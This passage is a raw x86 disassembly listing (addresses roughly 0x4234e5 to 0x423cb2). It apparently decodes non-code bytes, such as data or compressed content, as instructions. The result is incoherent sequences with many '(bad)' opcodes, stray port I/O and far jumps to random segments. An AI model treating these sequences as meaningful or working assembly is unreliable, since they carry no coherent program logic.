  4234e5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4234e6:	loop   0x42347c
  4234e8:	add    BYTE PTR [eax],0xce
  4234eb:	push   esp
  4234ec:	test   DWORD PTR [ebp-0x38bf7181],ebp
  4234f2:	or     al,0xea
  4234f4:	mov    DWORD PTR [ecx+0xa],ebx
  4234f7:	pop    eax
  4234f8:	jecxz  0x4234fc
  4234fa:	mov    cl,0xfb
  4234fc:	loope  0x42352a
  4234fe:	test   al,0x54
  423500:	pop    ecx
  423501:	mov    bh,0x1f
  423503:	pop    edi
  423504:	fstp   DWORD PTR [edx+0x5d]
  423507:	xchg   BYTE PTR [ecx+0x3cc70fc5],cl
  42350d:	add    al,0x3c
  42350f:	xchg   ebx,eax
  423510:	leave  
  423511:	add    eax,0x9e740a4
  423516:	fisubr WORD PTR [ebx+0x73]
  423519:	xchg   esp,eax
  42351a:	pusha  
  42351b:	jnp    0x42358b
  42351d:	or     ah,BYTE PTR [eax]
  42351f:	data16 sbb bh,dh
  423522:	out    0xd4,eax
  423524:	or     eax,0xc88fecc8
  423529:	jl     0x4234c0
  42352b:	ror    DWORD PTR [eax-0x4acd6a83],cl
  423531:	lods   al,BYTE PTR ds:[esi]
  423532:	inc    esp
  423533:	ror    ch,1
  423535:	add    eax,0xe1c1bf2c
  42353a:	sbb    BYTE PTR [ebp+0x339688ed],bh
  423540:	push   ebp
  423541:	add    edx,DWORD PTR [esi+edx*4-0x54]
  423545:	cli    
  423546:	aad    0xe4
  423548:	xchg   ebx,eax
  423549:	add    ch,BYTE PTR [edx]
  42354b:	ret    
  42354c:	adc    esi,DWORD PTR [eax+0x11]
  42354f:	mov    ebx,DWORD PTR [esi]
  423551:	out    0x1f,eax
  423553:	fldenv [edi]
  423555:	xchg   ebx,eax
  423556:	xor    al,0xf1
  423558:	jbe    0x423511
  42355a:	sbb    esi,edx
  42355c:	sub    esp,DWORD PTR [edx+0x4c]
  42355f:	stos   DWORD PTR es:[edi],eax
  423560:	add    bl,al
  423562:	jecxz  0x423529
  423564:	inc    ebx
  423565:	fisub  WORD PTR [eax-0x5b]
  423568:	int    0xb7
  42356a:	loope  0x4235d2
  42356c:	(bad)  
  42356d:	fstp   DWORD PTR [esp+edx*8-0x7b68cb49]
  423574:	sbb    eax,esi
  423576:	dec    edx
  423577:	in     eax,0x89
  423579:	imul   ecx,DWORD PTR [edx-0x6b],0x42
  42357d:	test   al,0x86
  42357f:	pop    ds
  423580:	xchg   esi,eax
  423581:	ds mov al,0xfa
  423584:	imul   ecx,DWORD PTR [edx+0x76],0x5e
  423588:	stc    
  423589:	sbb    al,0x1f
  42358b:	pop    es
  42358c:	pop    ebx
  42358d:	pop    ss
  42358e:	and    DWORD PTR [ecx-0x1a],0xffffffaf
  423592:	adc    bl,dh
  423594:	mov    ebx,edx
  423596:	rep outs dx,BYTE PTR ds:[esi]
  423598:	div    DWORD PTR [edx-0x30]
  42359b:	fisubr WORD PTR [ebp+eax*1-0x2a0a81f0]
  4235a2:	adc    BYTE PTR ds:0x797d3908,bl
  4235a8:	in     eax,0xc4
  4235aa:	ret    0x6714
  4235ad:	fisubr DWORD PTR [ebx-0x6f]
  4235b0:	arpl   WORD PTR [ebx],ax
  4235b2:	xchg   esp,eax
  4235b3:	push   ebp
  4235b4:	jb     0x4235b3
  4235b6:	mov    al,0x3c
  4235b8:	jns    0x42353b
  4235ba:	pop    ds
  4235bb:	add    eax,DWORD PTR [ecx+ecx*2]
  4235be:	scas   eax,DWORD PTR es:[edi]
  4235bf:	aas    
  4235c0:	fidivr WORD PTR [eax]
  4235c2:	es pushf 
  4235c4:	call   0x429680d2
  4235c9:	mov    eax,0x8ca74bea
  4235ce:	jg     0x4235fa
  4235d0:	mov    BYTE PTR [ebx+0x48],al
  4235d3:	push   esi
  4235d4:	out    dx,eax
  4235d5:	int3   
  4235d6:	aaa    
  4235d7:	jmp    0x4235df
  4235d9:	imul   esi,edx,0xffffffeb
  4235dc:	rol    DWORD PTR ds:0xf1fec7d2,1
  4235e2:	(bad)  
  4235e3:	stos   BYTE PTR es:[edi],al
  4235e4:	scas   eax,DWORD PTR es:[edi]
  4235e5:	and    ebx,DWORD PTR [edx+0x764188e5]
  4235eb:	pop    ecx
  4235ec:	or     dh,BYTE PTR [edx-0x77]
  4235ef:	aad    0xfd
  4235f1:	sbb    al,0xf2
  4235f3:	sbb    ch,BYTE PTR [edi]
  4235f5:	retf   
  4235f6:	mov    eax,0xbb1b88d1
  4235fb:	ficomp DWORD PTR [edx]
  4235fd:	sbb    BYTE PTR [edx+0x1a05f3b2],dh
  423603:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423604:	or     eax,0xc0510b2c
  423609:	in     eax,0x1f
  42360b:	stos   DWORD PTR es:[edi],eax
  42360c:	cmp    ecx,ebp
  42360e:	loopne 0x423684
  423610:	test   BYTE PTR [esi-0x45],bh
  423613:	aam    0x39
  423615:	xchg   esp,eax
  423616:	std    
  423617:	(bad)  
  423618:	aam    0xcb
  42361a:	fnstcw WORD PTR [edx+0x6e86878b]
  423620:	mov    cl,0x54
  423622:	adc    bl,BYTE PTR [edi+0x38]
  423625:	outs   dx,DWORD PTR ds:[esi]
  423626:	mov    fs,WORD PTR [edx+0x2b4776ba]
  42362c:	mov    DWORD PTR [eax+0x3eeb12c5],ebx
  423632:	sbb    BYTE PTR [eax-0x77],bh
  423635:	dec    ebp
  423636:	call   0xec65:0x8f1819ff
  42363d:	cli    
  42363e:	es test eax,0x1429ce68
  423644:	into   
  423645:	add    bh,BYTE PTR ds:0x6ad78a8d
  42364b:	add    edx,eax
  42364d:	mov    eax,ds:0xc8885255
  423652:	or     esi,DWORD PTR [eax]
  423654:	adc    eax,0xe6054602
  423659:	jecxz  0x4236c4
  42365b:	enter  0xae79,0x1f
  42365f:	and    esp,DWORD PTR [ecx+ebp*1+0x6452ac2f]
  423666:	pop    ebx
  423667:	mov    ds:0xda12b899,al
  42366c:	mov    BYTE PTR [edi+0x3cfc8044],bh
  423672:	or     eax,edi
  423674:	mov    DWORD PTR [ebp-0x35],edi
  423677:	imul   ecx,DWORD PTR [edi],0xc059e25f
  42367d:	add    eax,0x30f27d90
  423682:	out    0x9b,al
  423684:	jae    0x423674
  423686:	pop    ds
  423687:	stos   DWORD PTR es:[edi],eax
  423688:	mov    bl,0x1e
  42368a:	mov    ah,cl
  42368c:	es clc 
  42368e:	and    edx,edi
  423690:	mov    ebp,0xcb43d1c0
  423695:	loopne 0x4236b8
  423697:	and    eax,0xe720b06c
  42369c:	mov    DWORD PTR [edi-0x30b905cd],esp
  4236a2:	scas   eax,DWORD PTR es:[edi]
  4236a3:	cmp    DWORD PTR [esi],0x100dbc03
  4236a9:	mov    bh,0x6c
  4236ab:	out    dx,al
  4236ac:	iret   
  4236ad:	cmc    
  4236ae:	pusha  
  4236af:	aad    0xa6
  4236b1:	lahf   
  4236b2:	and    BYTE PTR [edx+0x1c],0xfe
  4236b6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4236b8:	fiadd  DWORD PTR [edx+0x5]
  4236bb:	mov    DWORD PTR es:[ecx+ebp*4+0xd],edi
  4236c0:	jae    0x423708
  4236c2:	push   ds
  4236c3:	aad    0x72
  4236c5:	lahf   
  4236c6:	dec    ecx
  4236c7:	lods   eax,DWORD PTR ds:[esi]
  4236c8:	inc    eax
  4236c9:	ret    0xd5e7
  4236cc:	mov    bl,0xc2
  4236ce:	rol    BYTE PTR [eax],0xeb
  4236d1:	inc    ecx
  4236d2:	mov    bh,0xbe
  4236d4:	hlt    
  4236d5:	imul   eax,esp,0x486f85d4
  4236db:	push   cs
  4236dc:	dec    esp
  4236dd:	jmp    0x423692
  4236df:	aad    0xb9
  4236e1:	stc    
  4236e2:	add    eax,0xc5b1043d
  4236e7:	mov    ds:0x41ddfd8b,eax
  4236ec:	pop    ebp
  4236ed:	aas    
  4236ee:	xchg   edi,eax
  4236ef:	mov    ah,0x8
  4236f1:	pusha  
  4236f2:	int    0xd8
  4236f4:	jno    0x4236f9
  4236f6:	in     al,0x49
  4236f8:	daa    
  4236f9:	inc    eax
  4236fa:	add    BYTE PTR ds:0x7593cc82,0x91
  423701:	xor    eax,0x1ccc989f
  423706:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423707:	adc    al,0x78
  423709:	add    edi,DWORD PTR [eax]
  42370b:	mov    eax,0x797193d6
  423710:	movs   DWORD PTR es:[di],DWORD PTR ds:[si]
  423712:	pop    esp
  423713:	xor    DWORD PTR [edx],ecx
  423715:	hlt    
  423716:	lahf   
  423717:	arpl   si,ax
  423719:	jmp    0x414a:0x2749969
  423720:	dec    edx
  423721:	dec    esp
  423722:	cmp    BYTE PTR [ecx],cl
  423724:	push   ebp
  423725:	enter  0x1360,0xc
  423729:	ins    BYTE PTR es:[edi],dx
  42372a:	add    BYTE PTR [edx],0x48
  42372d:	pop    esi
  42372e:	push   cs
  42372f:	xlat   BYTE PTR ds:[ebx]
  423730:	out    dx,eax
  423731:	fwait
  423732:	mov    bh,0x66
  423734:	mov    bh,0xf7
  423736:	ins    DWORD PTR es:[edi],dx
  423737:	ret    0xa588
  42373a:	push   cs
  42373b:	out    dx,eax
  42373c:	stc    
  42373d:	and    DWORD PTR [ebx],eax
  42373f:	fistp  WORD PTR [esi+0x56]
  423742:	rol    dh,1
  423744:	dec    esp
  423745:	add    cl,BYTE PTR [esi]
  423747:	mov    WORD PTR [edi],gs
  423749:	fimul  WORD PTR [esi]
  42374b:	xchg   edx,eax
  42374c:	mov    DWORD PTR [ebp-0x7e],ebp
  42374f:	call   0x58e:0x1f97b603
  423756:	push   esp
  423757:	test   bl,bl
  423759:	dec    edi
  42375a:	xchg   esi,eax
  42375b:	sbb    al,0x71
  42375d:	mov    DWORD PTR [eax+0x71],esp
  423760:	or     eax,DWORD PTR [eax+0x4a]
  423763:	mov    bl,0x44
  423765:	cld    
  423766:	dec    eax
  423767:	aam    0x3f
  423769:	jne    0x423745
  42376b:	mov    BYTE PTR [esi-0x15],bl
  42376e:	test   eax,0x1f2f6d2e
  423773:	(bad)
  423776:	dec    esi
  423777:	push   ebp
  423778:	(bad)  
  42377a:	inc    esi
  42377b:	stos   BYTE PTR es:[edi],al
  42377c:	es push ebp
  42377e:	es adc eax,0xa7ce37d
  423784:	add    dl,BYTE PTR [ebx+0x1f]
  423787:	jae    0x42372b
  423789:	fld    DWORD PTR [edx+0x5b]
  42378c:	cld    
  42378d:	hlt    
  42378e:	xor    esp,0x75
  423791:	add    esp,edx
  423793:	mov    esi,0x4807dae9
  423798:	pushf  
  423799:	ss popa 
  42379b:	adc    eax,0x2e0457d6
  4237a0:	scas   eax,DWORD PTR es:[edi]
  4237a1:	push   esi
  4237a2:	aas    
  4237a3:	retf   0x5ae
  4237a6:	pop    eax
  4237a7:	leave  
  4237a8:	ins    BYTE PTR es:[edi],dx
  4237a9:	jnp    0x4237e1
  4237ab:	and    esi,ecx
  4237ad:	aam    0x60
  4237af:	xchg   ecx,eax
  4237b0:	fstp   TBYTE PTR [edx-0x7cbf3044]
  4237b6:	jnp    0x42378d
  4237b8:	push   es
  4237b9:	lods   eax,DWORD PTR ds:[esi]
  4237ba:	cmp    eax,0x4fd5a81
  4237bf:	lods   eax,DWORD PTR ds:[esi]
  4237c0:	mov    DWORD PTR [ebx-0x1d5ede98],ebp
  4237c6:	bound  ebx,QWORD PTR [edx-0x2b213a50]
  4237cc:	rol    esp,0xa3
  4237cf:	mov    BYTE PTR [ebx-0x6129b98],0x1e
  4237d6:	pop    ds
  4237d7:	dec    ecx
  4237d8:	adc    al,0x12
  4237da:	xchg   edx,eax
  4237db:	out    0x20,eax
  4237dd:	lods   al,BYTE PTR ds:[esi]
  4237de:	call   0x1d1c06b7
  4237e3:	ret    0xa358
  4237e6:	adc    al,0x8b
  4237e8:	mov    bl,bh
  4237ea:	out    dx,al
  4237eb:	dec    ebp
  4237ec:	(bad)  
  4237ed:	enter  0x307f,0x3
  4237f1:	adc    al,0xc8
  4237f3:	frstor [ecx]
  4237f5:	sbb    al,0xb7
  4237f7:	adc    al,0xa9
  4237f9:	sbb    ecx,DWORD PTR [ecx+0x4d7588c1]
  4237ff:	xor    esp,DWORD PTR [ecx+0x1b814c8f]
  423805:	es stos BYTE PTR es:[edi],al
  423807:	mov    edx,0xeade6ea5
  42380c:	inc    ebp
  42380d:	jle    0x423866
  42380f:	add    ecx,DWORD PTR [ecx-0xd4c603]
  423815:	stos   BYTE PTR es:[edi],al
  423816:	out    dx,eax
  423817:	jp     0x423800
  423819:	push   0x12
  42381b:	adc    eax,0x50ac249a
  423820:	or     DWORD PTR [esi],esp
  423822:	sub    BYTE PTR [ebx+0x55],al
  423825:	xor    eax,0x35c799d
  42382a:	jecxz  0x423811
  42382c:	push   ss
  42382d:	in     eax,dx
  42382e:	loope  0x42388b
  423830:	jmp    0xa0aa:0x6bf6d205
  423837:	or     al,0x38
  423839:	sahf   
  42383a:	pusha  
  42383b:	jmp    0x42388e
  42383d:	sub    dl,BYTE PTR [edx-0x6e]
  423840:	or     BYTE PTR [edx+edx*8-0x51e6d2c],bh
  423847:	fst    QWORD PTR [edx-0x67]
  42384a:	or     bp,WORD PTR [esi+0xd]
  42384e:	pusha  
  42384f:	jo     0x42389a
  423851:	in     eax,0x1f
  423853:	jnp    0x42388f
  423855:	jbe    0x423885
  423857:	into   
  423858:	call   0xe8195fd0
  42385d:	adc    al,0x95
  42385f:	or     eax,0x93f860a5
  423864:	test   eax,0xfd056552
  423869:	(bad)  
  42386a:	or     al,0x82
  42386c:	adc    eax,0xd26a5953
  423871:	add    eax,0x4f53cfb6
  423876:	add    al,0x41
  423878:	and    eax,0xb8d5bbd5
  42387d:	in     al,0x9d
  42387f:	lds    ecx,FWORD PTR [ecx-0xa33cf79]
  423885:	sbb    esp,DWORD PTR [ecx+0x441434d3]
  42388b:	cmp    edi,ebp
  42388d:	ret    0x1440
  423890:	xor    BYTE PTR [ebx+0x7f9b63e1],0x21
  423897:	xor    DWORD PTR [edi-0x12516fb],ebx
  42389d:	jmp    0x1ff248c4
  4238a2:	neg    BYTE PTR [esi+0x5f]
  4238a5:	mov    eax,0x853646dd
  4238aa:	ins    DWORD PTR es:[edi],dx
  4238ab:	mov    ebx,0x69eac258
  4238b0:	sub    ch,cl
  4238b2:	jg     0x4238dc
  4238b4:	(bad)  
  4238b5:	ret    
  4238b6:	or     cl,0x5e
  4238b9:	cld    
  4238ba:	mov    ah,0x15
  4238bc:	mov    fs,WORD PTR [esp+esi*2-0x2a]
  4238c0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4238c1:	js     0x423850
  4238c3:	inc    ecx
  4238c4:	push   eax
  4238c5:	add    BYTE PTR [edi+0x14],bl
  4238c8:	fcom   DWORD PTR [ecx-0x48daea82]
  4238ce:	push   ecx
  4238cf:	adc    al,0xd5
  4238d1:	icebp  
  4238d2:	fld    QWORD PTR [ecx-0x28a52528]
  4238d8:	sbb    bh,al
  4238da:	iret   
  4238db:	ss pop esp
  4238dd:	shr    BYTE PTR [ecx-0x1b],1
  4238e0:	rcl    DWORD PTR [edx-0xe7710d9],1
  4238e6:	jle    0x4238e9
  4238e8:	mov    bl,0xd6
  4238ea:	arpl   WORD PTR [eax],sp
  4238ec:	call   0xcf4c92f4
  4238f1:	dec    eax
  4238f2:	call   0x881b:0x62da3d0c
  4238f9:	pop    ds
  4238fa:	cdq    
  4238fb:	mov    ebp,DWORD PTR [edx+0x1b5b81ff]
  423901:	add    al,BYTE PTR [esi-0x5d9a7f06]
  423907:	sub    eax,0xe71f6720
  42390c:	(bad)  
  42390d:	pop    edi
  42390e:	jmp    0xd904b37b
  423913:	mov    edx,0x436013f5
  423918:	or     DWORD PTR [esi+eax*2+0x2],ebp
  42391c:	in     eax,0xb0
  42391e:	pop    ds
  42391f:	mov    eax,ds:0x5d3d5192
  423924:	int3   
  423925:	inc    eax
  423926:	je     0x4238e1
  423928:	mov    ah,0xff
  42392a:	outs   dx,BYTE PTR ds:[esi]
  42392b:	sub    eax,0xc2a71788
  423930:	add    al,0x9b
  423932:	dec    ebp
  423933:	sbb    ebp,DWORD PTR [edi+0x58ed66e7]
  423939:	and    ch,BYTE PTR [eax+0x11]
  42393c:	xor    al,cl
  42393e:	and    DWORD PTR [edx],esi
  423940:	xor    ebx,edi
  423942:	xor    al,BYTE PTR [ecx-0x3e9952a4]
  423948:	lock dec esi
  42394a:	in     eax,dx
  42394b:	adc    al,0x59
  42394d:	jb     0x423984
  42394f:	repz or eax,DWORD PTR [edx]
  423952:	adc    cl,BYTE PTR [esi+0x1bb8282f]
  423958:	aas    
  423959:	mov    ebx,0xe897c960
  42395e:	in     eax,0xf7
  423960:	xchg   BYTE PTR es:[ebp-0x4b0afb29],cl
  423967:	or     bh,cl
  423969:	test   DWORD PTR [ecx-0x2b],ecx
  42396c:	popa   
  42396d:	imul   edi,DWORD PTR [ebp-0x7e],0xd4d97690
  423974:	mov    bh,0x17
  423976:	sbb    eax,DWORD PTR [eax-0x74424c10]
  42397c:	mov    DWORD PTR [edi],ebx
  42397e:	imul   BYTE PTR [edi+esi*1-0x13]
  423982:	sub    al,0x95
  423984:	inc    ebx
  423985:	add    BYTE PTR [esi-0x24],ch
  423988:	push   edx
  423989:	sub    eax,edi
  42398b:	dec    ecx
  42398c:	xor    eax,0x895780d2
  423991:	loope  0x423980
  423993:	stc    
  423994:	and    DWORD PTR [ecx-0xdb53d44],0xfdc1d5a5
  42399e:	xor    al,BYTE PTR [edi]
  4239a0:	jbe    0x423a21
  4239a2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4239a3:	or     cl,BYTE PTR [eax+0x7d828cad]
  4239a9:	mov    al,0x94
  4239ab:	mov    bh,0xf4
  4239ad:	and    al,0xb0
  4239af:	sub    al,0xf
  4239b1:	repz fbld TBYTE PTR [edi+edi*8+0x33]
  4239b6:	dec    ecx
  4239b7:	sti    
  4239b8:	mov    BYTE PTR [edi],dh
  4239ba:	clc    
  4239bb:	outs   dx,DWORD PTR ds:[esi]
  4239bc:	xchg   DWORD PTR [ecx+0x374b393],ecx
  4239c2:	div    BYTE PTR [ecx+ebp*1+0x7de26399]
  4239c9:	fisub  DWORD PTR [eax-0x1f]
  4239cc:	push   ecx
  4239cd:	int3   
  4239ce:	ret    
  4239cf:	cwde   
  4239d0:	cmp    dl,BYTE PTR [esi]
  4239d2:	fnop   
  4239d4:	loope  0x4239bf
  4239d6:	xchg   esi,eax
  4239d7:	dec    eax
  4239d8:	or     BYTE PTR [eax-0x22],al
  4239db:	aam    0x93
  4239dd:	fs push ds
  4239df:	test   DWORD PTR [edi-0x5e4faeb4],ebp
  4239e5:	into   
  4239e6:	lods   al,BYTE PTR ds:[esi]
  4239e7:	shl    DWORD PTR [edx+eax*1+0x14],0x42
  4239ec:	push   esi
  4239ed:	pop    ss
  4239ee:	adc    eax,0x3f5f4ad3
  4239f3:	test   al,0x89
  4239f5:	mov    ch,0xdc
  4239f7:	mov    edx,0xffe87bce
  4239fc:	ret    0xe3f3
  4239ff:	aad    0x69
  423a01:	repz adc BYTE PTR [edi-0x69a11b4e],0x89
  423a09:	pop    ebp
  423a0a:	xchg   BYTE PTR [edi],ah
  423a0c:	mov    edi,0x1742f22b
  423a11:	mov    esp,DWORD PTR [ecx+0x5e]
  423a14:	mov    DWORD PTR [ecx],esi
  423a16:	out    dx,al
  423a17:	fstp   DWORD PTR [edx+0x43]
  423a1a:	mov    edi,0x7187f0a4
  423a1f:	aad    0x15
  423a21:	aad    0xdf
  423a23:	int3   
  423a24:	dec    edi
  423a25:	mov    WORD PTR [edx+0x6d47e446],gs
  423a2b:	pushf  
  423a2c:	out    0x41,al
  423a2e:	pop    edx
  423a2f:	repnz stos DWORD PTR es:[edi],eax
  423a31:	sub    eax,0xd14b0bf
  423a36:	pop    ds
  423a37:	leave  
  423a38:	in     al,dx
  423a39:	into   
  423a3a:	jo     0x423a59
  423a3c:	sub    ch,BYTE PTR [ecx]
  423a3e:	cmp    eax,0xbacd4ed7
  423a43:	stos   DWORD PTR es:[edi],eax
  423a44:	push   ebx
  423a45:	test   eax,0x1d884c9e
  423a4a:	and    esi,eax
  423a4c:	out    dx,eax
  423a4d:	xchg   esi,eax
  423a4e:	outs   dx,DWORD PTR ds:[esi]
  423a4f:	ins    BYTE PTR es:[edi],dx
  423a50:	out    0x27,al
  423a52:	or     ch,BYTE PTR [ecx]
  423a54:	out    dx,eax
  423a55:	test   eax,0xb3b62660
  423a5a:	xchg   edi,eax
  423a5b:	mov    WORD PTR [ecx+0x3b31bb6f],cs
  423a61:	dec    ebp
  423a62:	ins    BYTE PTR es:[edi],dx
  423a63:	xchg   esi,eax
  423a64:	gs (bad) 
  423a66:	mov    al,ds:0xe036fc7
  423a6b:	ret    
  423a6c:	stos   BYTE PTR es:[edi],al
  423a6d:	xchg   esp,eax
  423a6e:	aas    
  423a6f:	dec    eax
  423a70:	sbb    BYTE PTR [edi-0x5acdc49d],ch
  423a76:	inc    ebx
  423a77:	adc    BYTE PTR [ebx+0x3],dh
  423a7a:	pop    ss
  423a7b:	inc    ecx
  423a7c:	cli    
  423a7d:	or     dh,bl
  423a7f:	aam    0xbd
  423a81:	jmp    0xcf3f:0x17ea0a95
  423a88:	mov    BYTE PTR [ebp+0x4b],bl
  423a8b:	mov    dh,0x75
  423a8d:	push   ss
  423a8e:	leave  
  423a8f:	les    ebx,FWORD PTR ds:0x4b3de003
  423a95:	arpl   bp,bx
  423a97:	mov    ds:0xe31f7bb6,al
  423a9c:	adc    ah,BYTE PTR [esi]
  423a9e:	dec    eax
  423a9f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423aa0:	inc    esp
  423aa1:	rol    DWORD PTR [ebp-0x61],0x1
  423aa5:	outs   dx,DWORD PTR ds:[esi]
  423aa6:	dec    esp
  423aa7:	jg     0x423ab1
  423aa9:	jmp    0x423a76
  423aab:	or     ecx,DWORD PTR [ecx+0x55d242ef]
  423ab1:	imul   BYTE PTR [esi+0x5c025cc6]
  423ab7:	dec    edx
  423ab8:	inc    esp
  423ab9:	and    ch,BYTE PTR ds:0x1fc6f9f3
  423abf:	mov    ds:0x80da85a2,eax
  423ac4:	call   0x5a16e30f
  423ac9:	outs   dx,DWORD PTR ds:[esi]
  423aca:	mov    dl,BYTE PTR [edi]
  423acc:	stos   BYTE PTR es:[edi],al
  423acd:	into   
  423ace:	jno    0x423ac6
  423ad0:	mov    DWORD PTR [ebx+0x351e44a5],eax
  423ad6:	mov    ch,0xf3
  423ad8:	dec    esp
  423ad9:	add    ebp,DWORD PTR [eax+0x722d2d9b]
  423adf:	sti    
  423ae0:	jl     0x423a95
  423ae2:	dec    esp
  423ae3:	leave  
  423ae4:	push   ecx
  423ae5:	pop    esp
  423ae6:	ins    BYTE PTR es:[edi],dx
  423ae7:	gs mov ch,0x78
  423aea:	add    DWORD PTR [edx-0x1b2146c0],esp
  423af0:	push   ss
  423af1:	ins    DWORD PTR es:[edi],dx
  423af2:	push   cs
  423af3:	xlat   BYTE PTR ds:[ebx]
  423af4:	sbb    BYTE PTR [ebx-0x715c07b2],cl
  423afa:	lods   eax,DWORD PTR ds:[esi]
  423afb:	add    DWORD PTR [ecx+0x60d9c00b],ecx
  423b01:	push   eax
  423b02:	cmp    BYTE PTR [esi-0x21],bh
  423b05:	dec    ebx
  423b06:	pop    edx
  423b07:	mov    esi,0xd551beb8
  423b0c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423b0d:	push   ds
  423b0e:	lock or al,0xbf
  423b11:	popf   
  423b12:	adc    al,BYTE PTR [esi-0x76]
  423b15:	(bad)  
  423b16:	fld    st(1)
  423b18:	xchg   edx,eax
  423b19:	inc    edx
  423b1a:	jo     0x423b5c
  423b1c:	add    BYTE PTR [ebp+0x1ab7d734],ah
  423b22:	daa    
  423b23:	ins    BYTE PTR es:[edi],dx
  423b24:	xchg   bl,dh
  423b26:	ss (bad) 
  423b29:	xchg   ebp,eax
  423b2a:	mov    eax,0x932e00d5
  423b2f:	mov    DWORD PTR [eax+0x38d2cee7],esp
  423b35:	mov    ch,0x71
  423b37:	test   al,0xcc
  423b39:	dec    edx
  423b3a:	aas    
  423b3b:	(bad)  
  423b3c:	aas    
  423b3d:	mov    WORD PTR [eax+0x51],fs
  423b40:	push   ebp
  423b41:	mov    bh,0xb2
  423b43:	dec    esi
  423b44:	push   0x4
  423b46:	inc    esp
  423b47:	lahf   
  423b48:	in     eax,dx
  423b49:	fisttp DWORD PTR [esi+0x54]
  423b4c:	jmp    FWORD PTR [ebx]
  423b4e:	push   ecx
  423b4f:	push   edi
  423b50:	xlat   BYTE PTR ds:[ebx]
  423b51:	jge    0x423b72
  423b53:	(bad)  [ebp+0x20]
  423b56:	sub    edi,DWORD PTR [esp+esi*8+0x7d57e91]
  423b5d:	mov    al,0x4f
  423b5f:	loop   0x423ba9
  423b61:	lea    esi,[ebx]
  423b63:	stc    
  423b64:	mov    edi,ecx
  423b66:	std    
  423b67:	dec    eax
  423b68:	leave  
  423b69:	sahf   
  423b6a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423b6b:	mov    esi,DWORD PTR [edi+0x33d2801c]
  423b71:	rcl    BYTE PTR [edx],1
  423b73:	cwde   
  423b74:	mov    BYTE PTR [edx],ch
  423b76:	shr    BYTE PTR [ebx+0x57603b88],0x21
  423b7d:	out    dx,eax
  423b7e:	outs   dx,DWORD PTR ds:[esi]
  423b7f:	int3   
  423b80:	in     eax,dx
  423b81:	add    cl,BYTE PTR [edx-0x6a]
  423b84:	repz sbb edx,eax
  423b87:	(bad)  
  423b88:	jmp    0x963e:0xe1191f9c
  423b8f:	mov    esi,0xbad00bea
  423b94:	pusha  
  423b95:	fimul  WORD PTR [esi-0x17ae7813]
  423b9b:	xchg   esp,eax
  423b9c:	add    al,0x2a
  423b9e:	repz jnp 0x423b9f
  423ba1:	mov    ecx,0xa0d5abdb
  423ba6:	cmp    al,0x1
  423ba8:	push   cs
  423ba9:	cs cld 
  423bab:	inc    esp
  423bac:	inc    eax
  423bad:	pop    ecx
  423bae:	mov    al,ds:0x99ed7cd3
  423bb3:	xor    ecx,ebp
  423bb5:	jge    0x423c26
  423bb7:	call   0x17b1:0xad5b348b
  423bbe:	pusha  
  423bbf:	xor    edx,DWORD PTR [ecx+ebp*1+0x44]
  423bc3:	sbb    BYTE PTR [eax],0x9d
  423bc6:	lock loope 0x423b94
  423bc9:	add    eax,0xf214dbaa
  423bce:	add    al,0xae
  423bd0:	ds int3 
  423bd2:	jb     0x423b5f
  423bd4:	jns    0x423b80
  423bd6:	sub    dl,BYTE PTR [ebx+edx*1-0x93d82]
  423bdd:	add    bh,dh
  423bdf:	fwait
  423be0:	test   eax,0xc06fd33f
  423be5:	and    DWORD PTR [ebp-0x29],ebp
  423be8:	fld    st(3)
  423bea:	push   0x25
  423bec:	mov    DWORD PTR [edx+0x3499df3],eax
  423bf2:	int3   
  423bf3:	leave  
  423bf4:	xor    dl,bh
  423bf6:	jmp    0x423b9b
  423bf8:	sar    BYTE PTR [ecx],1
  423bfa:	push   ds
  423bfb:	lahf   
  423bfc:	mov    WORD PTR [ebx+0x2b746b02],gs
  423c02:	mov    edx,0x328428d4
  423c07:	inc    ecx
  423c08:	jge    0x423bd6
  423c0a:	pop    ss
  423c0b:	mov    ebp,0x64b18d88
  423c10:	sbb    WORD PTR [edx+0x3014fd4d],dx
  423c17:	add    BYTE PTR [eax],bh
  423c19:	iret   
  423c1a:	sahf   
  423c1b:	xor    eax,0x3fd16bb8
  423c20:	mov    BYTE PTR ds:0xd5d174b6,ah
  423c26:	int    0xd6
  423c28:	mov    ds:0x6a8dba05,eax
  423c2d:	(bad)  
  423c2f:	lea    edi,[eax]
  423c31:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423c32:	pusha  
  423c33:	jnp    0x423ca4
  423c35:	push   esp
  423c36:	lea    ebx,[edi-0x6a]
  423c39:	inc    eax
  423c3a:	mov    dl,bl
  423c3c:	call   0x50de:0x525eefcb
  423c43:	dec    esi
  423c44:	mov    ebx,0x3d1b60b5
  423c49:	push   ebp
  423c4a:	dec    edi
  423c4b:	lds    eax,FWORD PTR [ebp+edi*4+0x6daf9c00]
  423c52:	cmc    
  423c53:	stos   BYTE PTR es:[edi],al
  423c54:	sbb    eax,0xceb651c2
  423c59:	retf   0xc97
  423c5c:	and    DWORD PTR [edx+0x1e],edi
  423c5f:	pop    ss
  423c60:	sub    eax,0x18e6458d
  423c65:	jg     0x423c76
  423c67:	xlat   BYTE PTR ds:[ebx]
  423c68:	or     BYTE PTR ds:[ebp-0x1ac9fd64],cl
  423c6f:	dec    ebp
  423c70:	xchg   DWORD PTR [ecx],esi
  423c72:	cmp    eax,0xdf1bec9b
  423c77:	stos   DWORD PTR es:[edi],eax
  423c78:	mov    al,ds:0xd19930c8
  423c7d:	loope  0x423c91
  423c7f:	push   esp
  423c80:	ficomp WORD PTR ds:0xa0023c55
  423c86:	pop    ds
  423c87:	std    
  423c88:	test   al,0xde
  423c8a:	cwde   
  423c8b:	mov    ebx,0xd4a87b9e
  423c90:	jns    0x423c37
  423c92:	add    BYTE PTR [edx+ebx*4-0x770a67cf],0x61
  423c9a:	dec    eax
  423c9b:	pop    ds
  423c9c:	retf   
  423c9d:	repz xor al,0x6
  423ca0:	test   DWORD PTR [edx],0x731887e
  423ca6:	idiv   BYTE PTR [edx-0x18859462]
  423cac:	fsub   st(0),st
  423cae:	jb     0x423d29
  423cb0:	cmp    BYTE PTR [edx],al
  423cb2:	test   eax,0x69e2898
